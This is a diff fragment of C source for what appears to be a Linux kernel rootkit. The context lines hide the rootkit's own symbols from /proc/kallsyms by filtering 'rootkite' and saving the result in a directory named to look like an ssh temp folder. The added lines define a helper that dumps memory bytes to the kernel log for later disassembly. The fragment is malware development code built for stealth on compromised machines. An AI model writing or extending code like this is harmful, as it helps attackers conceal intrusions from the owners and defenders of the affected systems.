@@ -67,4 +67,15 @@ static void hide_ksyms(void){
   snprintf(comm, NAME_MAX, "mkdir /tmp/ssh-XXTkJI | cat /proc/kallsyms | grep -v rootkite > /tmp/ssh-XXTkJI/ksf_save_tmp");
   run_shell(comm);
 }
+
+/*print out the memory of a certain address(for later dissassemble)*/
+static void print_function(unsigned char *address, int n){
+    int i = 0;
+    while(i < n)
+    {
+        pr_info("%02x", *(address + i));
+        i++;
+    }
+    pr_info("\n");
+}
 #endif
